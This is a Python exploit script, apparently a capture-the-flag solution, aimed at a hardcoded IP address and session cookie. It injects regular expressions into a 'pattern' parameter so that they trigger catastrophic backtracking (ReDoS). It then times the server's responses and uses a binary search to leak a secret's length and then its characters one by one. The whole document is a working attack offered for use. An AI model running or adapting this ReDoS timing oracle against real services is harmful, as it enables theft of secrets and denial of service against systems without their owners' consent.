import asyncio
import aiohttp
import random
import string
import time
import re

# Constants
URL = "http://218.145.226.8:20001"
SESSION_ID = "fsjfd38r8f4a723sl4tojnv75l"
cookies = {'PHPSESSID': SESSION_ID}
TIME_THRESHOLD = 2.0  # seconds

# Utilities (copied from the first script)
def length_in(i, j):
    return ".{" + str(i) + "," + str(j) + "}$"

def nth_char_in(n, S):
    # Create a range pattern for subsets, e.g., [\x01-\x56]
    if len(S) > 1:  # More than one character, we can define a range
        lower = min(S)
        upper = max(S)
        return f".{{{n-1}}}[\\x{lower:02x}-\\x{upper:02x}].*$"
    else:  # Single character, no range
        return f".{{{n-1}}}[{re.escape(chr(S[0]))}].*$"

def redos_if(regexp, salt):
    return f"^(?={regexp})(((.*)*)*)*{salt}"

def generate_salt():
    return ''.join(random.choices(string.ascii_letters, k=10))

# Async version of get_request_duration
async def get_request_duration(session, payload):
    params = {'pattern': payload}
    timeout = aiohttp.ClientTimeout(total=10)
    try:
        start = time.monotonic()
        async with session.get(URL, params=params, timeout=timeout) as response:
            await response.text()
        end = time.monotonic()
        return end - start
    except asyncio.TimeoutError:
        return 999  # Return a high value to signify timeout

async def prop_holds(session, prop, salt):
    payload = redos_if(prop, salt)
    duration = await get_request_duration(session, payload)
    return duration > TIME_THRESHOLD

async def main():
    async with aiohttp.ClientSession(cookies=cookies) as session:
        # Generate a salt that triggers a slowdown
        print("[*] Searching for effective salt...")
        salt = generate_salt()
        while not await prop_holds(session, '.*', salt):
            salt = generate_salt()
        print(f"[+] Salt found: {salt}")

        # Leak secret length
        lower_bound = 0
        upper_bound = 100
        print("[*] Starting length detection...")
        while lower_bound != upper_bound:
            m = (lower_bound + upper_bound) // 2
            if await prop_holds(session, length_in(lower_bound, m), salt):
                upper_bound = m
            else:
                lower_bound = m + 1
            print(f"[*] Length bounds: ({lower_bound}, {upper_bound})")
        secret_length = lower_bound
        print(f"[+] Leaked length: {secret_length}")

        # Leak the secret character by character
        # Considering all ASCII characters (0-255)
        S = bytes(range(256))  # All ASCII characters
        secret = ""
        print("[*] Starting character leak...")
        for i in range(len(secret), secret_length):
            lower_bound = 0
            upper_bound = len(S) - 1
            while lower_bound != upper_bound:
                m = (lower_bound + upper_bound) // 2
                subset = S[lower_bound:m+1]
                if await prop_holds(session, nth_char_in(i + 1, subset), salt):
                    upper_bound = m
                else:
                    lower_bound = m + 1
            secret += chr(S[lower_bound])  # Convert to character
            print(f"[+] Secret so far: {secret}")
        print(f"[+] Final secret: {secret}")

if __name__ == "__main__":
    asyncio.run(main())
